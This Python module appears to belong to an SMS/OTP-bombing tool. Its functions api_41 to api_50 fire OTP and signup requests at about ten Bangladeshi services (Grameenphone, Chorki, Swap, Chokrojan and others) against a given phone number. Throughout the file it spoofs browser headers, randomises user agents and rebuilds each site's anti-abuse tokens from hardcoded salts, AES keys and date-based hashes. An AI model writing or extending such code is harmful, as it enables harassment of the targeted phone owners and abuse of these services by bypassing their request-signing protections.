import requests
import base64
import hashlib
import time
from datetime import datetime, timezone
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from .utils import send_request, random_string, get_random_user_agent

def api_41(number):
    try:
        pre_url = "https://api.cartup.com/product/api/v1/homepage-layouts/get-desktop-homepage-layouts-config"
        
        session = requests.Session()
        ua = get_random_user_agent()
        session.headers.update({
             'User-Agent': ua,
             'Accept': '*/*'
        })
        
        pre_resp = session.get(pre_url, timeout=10)
        config_header = pre_resp.headers.get('cf-ray-status-id-tn')
        
        sxsrf_token = ""
        if config_header:
            t1 = base64.b64encode(config_header.encode('utf-8')).decode('utf-8')
            sxsrf_token = base64.b64encode(t1.encode('utf-8')).decode('utf-8')
        
        if not sxsrf_token:
            pass

        url = "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup"
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/json; charset=utf-8',
            'dnt': '1',
            'origin': 'https://cartup.com',
            'priority': 'u=1, i',
            'referer': 'https://cartup.com/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sxsrf': sxsrf_token, 
            'user-agent': ua,
        }
        data = {
            'email_or_phone': number,
        }
        
        response = send_request(url, "POST", headers, data)
        
        # Response Validation
        try:
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get("success") is True or json_data.get("code") == "REQUEST_SUCCESS":
                    return response
                else:
                    response.status_code = 400
                    return response
            elif response:
                 pass
        except Exception as e:
            print(f"api_41 Validation Error: {e}")
            if response:
                response.status_code = 400
        
        return response

    except Exception as e:
        print(f"api_41 Error: {e}")
        return None

def api_42(number):
    url = "https://api-dynamic.chorki.com/v2/auth/login"
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': f'Bearer {random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")}',  # ডায়নামিক টোকেন
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.chorki.com',
        'priority': 'u=1, i',
        'referer': 'https://www.chorki.com/',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    params = {
        'country': 'BD',
        'platform': 'web',
        'language': 'en',
    }
    data = {
        'number': f'+88{number}',
    }
    response = send_request(url, "POST", headers, data, params=params)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("success") is True:
                return response
            else:
                print(f"api_42 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_42 Validation Error: {e}")

    return response

def api_43(number):
    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'DNT': '1',
        'Origin': 'https://www.grameenphone.com',
        'Referer': 'https://www.grameenphone.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': get_random_user_agent(),
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'msisdn': number,
    }
    response = send_request(url, "POST", headers, data=data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") is True:
                return response
            else:
                print(f"api_43 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_43 Validation Error: {e}")

    return response

def api_44(number):
    url = "https://www.ieducationbd.com/api/account/check_user"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.ieducationbd.com',
        'priority': 'u=1, i',
        'referer': 'https://www.ieducationbd.com/login',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': get_random_user_agent(),
    }

    json_data = {
        'mobile': number,
    }

    response = send_request(url, "POST", headers, json_data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("response") == "success":
                return response
            else:
                print(f"api_44 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_44 Validation Error: {e}")

    return response

def api_45(number):
    url = "https://bb-api.bohubrihi.com/public/activity/otp"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://bohubrihi.com',
        'priority': 'u=1, i',
        'referer': 'https://bohubrihi.com/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }

    json_data = {
        'phone': number,
        'intent': 'login',
    }

    response = send_request(url, "POST", headers, json_data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("code") == 200:
                return response
            else:
                print(f"api_45 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_45 Validation Error: {e}")

    return response

def api_46(number):
    url = "https://apix.rabbitholebd.com/appv2/login/requestOTP"
    
    timestamp = str(int(time.time()))
    salt = "4e369f3821e64f0fbdf58994cc755ef"
    hash_val = hashlib.sha256((timestamp + salt).encode()).hexdigest()
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'current-time': timestamp,
        'dnt': '1',
        'hash': hash_val,
        'origin': 'https://www.rabbitholebd.com',
        'priority': 'u=1, i',
        'referer': 'https://www.rabbitholebd.com/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }
    
    # Ensure number format is correct (user snippet used +880...)
    formatted_number = number
    if not formatted_number.startswith('+'):
        formatted_number = f"+88{formatted_number}"
        
    data = {
        'mobile': formatted_number,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == "success":
                return response
            else:
                print(f"api_46 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_46 Validation Error: {e}")

    return response

def api_47(number):
    url = "https://api.swap.com.bd/api/v1/send-otp/v2"
    
    timestamp_ms = int(time.time() * 1000)
    # Ensure number starts with 0 for swap logic
    plain_number = number[-11:] if len(number) >= 11 else number
    input_str = f"{plain_number}-{timestamp_ms}"
    
    key = bytes.fromhex("AE8C68531267DE601F7B3B8EB31F0E1F")
    iv = bytes.fromhex("FFF9C2105C9EE5713594EBDE80E1F383")
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(input_str.encode(), AES.block_size))
    signature = base64.b64encode(ct_bytes).decode()
    
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://swap.com.bd',
        'Referer': 'https://swap.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': get_random_user_agent(),
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'signature': signature,
    }
    data = {
        'phone': plain_number,
    }
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("success") is True or json_data.get("code") == 200:
                return response
            else:
                print(f"api_47 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_47 Validation Error: {e}")

    return response

def api_48(number):
    url = "https://api-gateway.sundarbancourierltd.com/graphql"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://customer.sundarbancourierltd.com',
        'priority': 'u=1, i',
        'referer': 'https://customer.sundarbancourierltd.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': get_random_user_agent(),
    }

    json_data = {
        'operationName': 'CreateAccessToken',
        'variables': {
            'accessTokenFilter': {
                'userName': number,
            },
        },
        'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n      __typename\n    }\n    __typename\n  }\n}',
    }

    response = send_request(url, "POST", headers, json_data)
    
    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("data", {}).get("createAccessToken", {}).get("message") == "SUCCESS":
                return response
            else:
                print(f"api_48 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_48 Validation Error: {e}")

    return response

def api_49(number):
    try:
        # User requested fresh cookies every time
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})
        session.get('https://chokrojan.com/login', timeout=10)
        
        url = 'https://chokrojan.com/api/v1/passenger/login/mobile'
        
        now = datetime.now(timezone.utc)
        code = ("chkjan" +
                str(now.hour).zfill(2) +
                str(now.month).zfill(2) +
                str(now.year) +
                str(now.day).zfill(2))
        otp_token = hashlib.sha256(code.encode('utf-8')).hexdigest()

        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Access-Control-Allow-Origin': '*',
            'Authorization': 'Bearer null',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json;charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://chokrojan.com',
            'Referer': 'https://chokrojan.com/login',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': session.headers['User-Agent'],
            'company-id': '1',
            'domain-name': 'chokrojan.com',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-platform': '3',
        }

        json_data = {
            'mobile_number': number,
            'otp_token': otp_token,
        }

        response = session.post(url, headers=headers, json=json_data, timeout=10)
        
        # Response Validation
        try:
            if response and response.status_code == 200:
                json_data = response.json()
                if json_data.get("message") == "Otp successfully sent":
                    return response
                else:
                    print(f"api_49 Validation Failed: {json_data}")
                    response.status_code = 400
                    return response
        except Exception as e:
            print(f"api_49 Validation Error: {e}")
            
        return response
    except Exception as e:
        print(f"api_49 Error: {e}")
        return None

def api_50(number):
    url = 'https://api-dynamic.bioscopelive.com/v2/auth/login'
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://www.bioscopeplus.com',
        'priority': 'u=1, i',
        'referer': 'https://www.bioscopeplus.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': get_random_user_agent(),
    }

    params = {
        'country': 'BD',
        'platform': 'web',
        'language': 'en',
    }
    
    formatted_number = number
    if not formatted_number.startswith('+880'):
        # Ensure it has exactly 11 digits and starts with +880
        clean_num = formatted_number[-11:]
        if clean_num.startswith('0'):
            formatted_number = f"+88{clean_num}"
        else:
            formatted_number = f"+880{clean_num}"

    json_data = {
        'number': formatted_number,
    }

    response = send_request(url, "POST", headers, json_data, params=params)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("success") is True:
                return response
            else:
                print(f"api_50 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_50 Validation Error: {e}")

    return response